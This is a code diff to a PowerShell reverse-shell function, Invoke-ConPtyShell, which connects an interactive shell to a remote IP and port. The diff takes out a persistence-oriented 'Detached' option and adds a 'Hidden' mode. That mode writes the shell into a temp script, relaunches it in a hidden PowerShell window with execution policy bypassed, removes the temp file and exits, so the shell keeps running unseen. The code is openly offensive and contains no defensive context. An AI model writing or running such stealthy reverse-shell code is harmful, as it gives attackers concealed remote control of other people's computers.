@@ -28,41 +28,37 @@ function Invoke-ConPtyShell
 
         [Parameter()]
         [Switch]
-        $Hidden,
-
-        [Parameter()]
-        [Switch]
-        $Detached  # New parameter for persistence
+        $Hidden
     )
     
-    # If hidden or detached, hide the window and make it independent
-    if ($Hidden -or $Detached) {
-        Add-Type -Name Window -Namespace Console -MemberDefinition '
-        [DllImport("Kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-        [DllImport("kernel32.dll")]
-        public static extern bool FreeConsole();
-        [DllImport("kernel32.dll")]
-        public static extern bool AllocConsole();
-        '
+    if ($Hidden) {
+        # Save current script to temp file for the new process to use
+        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
         
-        # If Detached, free the console to prevent it from dying when parent closes
-        if ($Detached) {
-            [Console.Window]::FreeConsole()
-            # Don't allocate a new one - let ConPtyShell handle its own console
-        }
+        # Get the current function's content
+        $functionContent = Get-Content Function:\Invoke-ConPtyShell
+        $fullScript = @"
+`$Source = @'
+$Source
+'@
+$functionContent
+Invoke-ConPtyShell -RemoteIp '$RemoteIp' -RemotePort '$RemotePort' -Rows '$Rows' -Cols '$Cols' -CommandLine '$CommandLine'
+"@
         
-        # If just Hidden (or both), hide the existing window
-        if ($Hidden) {
-            $consolePtr = [Console.Window]::GetConsoleWindow()
-            if ($consolePtr -ne [IntPtr]::Zero) {
-                [Console.Window]::ShowWindow($consolePtr, 0)
-            }
-        }
+        $fullScript | Out-File -FilePath $tempScript -Force
+        
+        # Launch new hidden process
+        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
+        
+        # Wait briefly then clean up
+        Start-Sleep -Seconds 3
+        Remove-Item $tempScript -Force
+        
+        # Exit current session
+        Write-Host "Shell moved to background. You can close this window."
+        exit
     }
-
+    
     if( $PSBoundParameters.ContainsKey('Upgrade') ) {
         $RemoteIp = "upgrade"
         $RemotePort = "shell"
